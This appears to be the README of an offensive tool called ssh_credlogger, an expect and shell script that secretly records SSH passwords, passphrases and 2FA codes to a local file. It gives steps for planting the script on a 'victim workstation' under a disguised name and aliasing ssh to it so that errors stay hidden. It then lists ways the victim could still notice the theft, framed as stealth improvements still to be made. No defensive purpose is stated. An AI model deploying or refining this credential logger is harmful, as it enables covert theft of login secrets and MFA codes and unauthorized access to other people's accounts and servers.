**ssh_credlogger**

An expect + sh script that logs passwords, passphrases, 2fa codes to a local file.

**Steps:**

- Copy this file and ssh_snoop.sh to victim workstation, renamed to something less obvious
- On victim workstation run alias ssh="/path/to/this/file.expect \$@ 2>/dev/null"
    (the stderr redirect prevents a 10-line error message when the user exits ssh)
- Ensure your alias links to the correct path for this file
- Ensure the "spawn" command below links to the correct path for the renamed ssh_snoop.sh

**Things to improve:**

- passcode1 is echoed after passcode2 entered 
- passcode2 does not steam out to tty, we only see passcode1 come out after a delay in one fell swoop
- when entering passcode2 the user may notice the "key" cursor instead of the normal cursor


- if user gives options for ssh like ssh -v, we go right to running the real ssh and do not record creds


- if user gives a bad password for the valid ssh, our log will record their 3rd password as the yubicode
   - I could probably rewrite the script to not be sequential but looped, to handle this properly

